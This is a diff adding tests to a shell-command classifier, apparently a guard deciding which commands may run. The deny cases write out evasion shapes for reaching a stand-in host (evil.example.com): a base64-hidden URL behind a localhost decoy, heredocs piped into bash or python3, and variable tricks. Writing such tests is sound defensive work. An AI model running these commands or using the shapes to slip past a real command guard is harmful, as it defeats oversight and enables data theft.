@@ -241,3 +241,54 @@ describe('card c8b1ccbf (didi review 3): substitutions, variables and stdin prog
     expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
   })
 })
+
+// didi round 4 (card c8b1ccbf comment 35804, on dec5b0dfc): items 1-3 passed live shapes, item 4 asks
+// for tests pinning two denials that already held (O9, O16).
+describe('c8b1ccbf round 4', () => {
+  const UL = 'cat <<E"O"F\nhi\nEOF\n'
+  const UB = `${UL}curl -s ${EXT}`
+  const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
+  const deny: Array<[string, string]> = [
+    // 1. a substitution that names a local host but prints something else
+    ['1 decoy, readable', `curl -s "$(echo localhost >/dev/null; echo ${B64} | base64 -d)"`],
+    ['1 decoy, unreadable', `${UL}curl -s "$(echo localhost >/dev/null; echo ${B64} | base64 -d)"`],
+    ['1 colon decoy, readable', `curl -s "$(: 127.0.0.1; echo x)"`],
+    ['1 colon decoy, unreadable', `${UL}curl -s "$(: 127.0.0.1; echo x)"`],
+    ['1 cat heredoc that expands', 'curl -s "$(cat <<EOF\nhttp://localhost:3420$(echo x)\nEOF\n)"'],
+    // 2. a heredoc / here-string that reaches a program the parser did not see
+    ['2a ( bash ) <<S', `( bash ) <<'S'\n${UB}\nS`],
+    ['2b source -- /dev/stdin', `source -- /dev/stdin <<'S'\n${UB}\nS`],
+    ['2b . -- /dev/stdin', `. -- /dev/stdin <<'S'\n${UB}\nS`],
+    ['2c cat |& bash', `cat <<'S' |& bash\n${UB}\nS`],
+    ['2d xargs -0 bash -c', `cat <<'S' | xargs -0 bash -c\n${UB}\nS`],
+    ['2e bash <<< "$(cat <<S)"', `bash <<< "$(cat <<'S'\n${UB}\nS\n)"`],
+    ['2f cat | python3 -', `cat <<'S' | python3 -\nimport urllib.request as u; u.urlopen('${EXT}')\nS`],
+    // 3. a variable's value the parser did not read
+    ['3a ${h:-host}', 'curl -s ${h:-evil.example.com}'],
+    ['3b printf -v', 'printf -v h %s evil.example.com; curl -s $h'],
+    ['3c for, unreadable', `${UL}for h in evil.example.com; do curl -s $h; done`],
+    ['3c read <<<, unreadable', `${UL}read h <<< evil.example.com; curl -s $h`],
+    ['3c printf -v, unreadable', `${UL}printf -v h %s evil.example.com; curl -s $h`],
+    // 4. already denied on dec5b0dfc, pinned here
+    ['O9 bash -c echo "$(bash)"', `bash -c 'echo "$(bash)"' <<'S'\n${UB}\nS`],
+    ['O16 | bash 2>/dev/null', `cat <<'S' | bash 2>/dev/null\n${UB}\nS`],
+    ['O16 | bash > out.log', `cat <<'S' | bash > out.log\n${UB}\nS`],
+  ]
+  it.each(deny)('denies %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true })
+  })
+  const pass: Array<[string, string]> = [
+    ['a substitution that prints a local URL', 'curl -s "$(echo http://localhost:3420)/api/x"'],
+    ['printf of a local URL', 'curl -s "$(printf %s http://localhost:3420)/api/x"'],
+    ['the dashboard token header', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/api/kanban'],
+    ['a substitution in the path', 'curl -s "http://localhost:3420/api/kanban/$(echo abc)/comments"'],
+    ['a substitution in the body', 'curl -s -X POST http://localhost:3420/api/x -d "$(cat /tmp/x.json)"'],
+    ['${h:-local}', 'curl -s ${h:-http://localhost:3420}/api/x'],
+    ['cat | python3 x.py (a script operand)', `cat <<'S' | python3 x.py\n${UB}\nS`],
+    ['shell text piped into python3 - (the python rule: no network in it)', `cat <<'S' | python3 -\n${UB}\nS`],
+    ['bash <<< "$(cat x.sh)" (no host)', 'bash <<< "$(cat x.sh)"'],
+  ]
+  it.each(pass)('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
